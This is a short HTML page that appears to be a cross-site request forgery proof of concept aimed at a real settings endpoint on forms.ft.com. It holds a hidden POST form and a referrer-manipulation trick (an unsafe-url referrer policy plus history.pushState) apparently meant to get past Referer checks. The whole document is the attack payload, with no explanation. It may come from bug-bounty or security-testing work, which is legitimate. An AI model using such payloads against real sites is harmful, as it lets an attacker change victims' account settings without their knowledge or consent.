<html>
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
  <form action="https://forms.ft.com/API/formuser/settings" method="POST">
    <input type="hidden" name="name" value="CSRF">
  </form>
  </body>
</html>
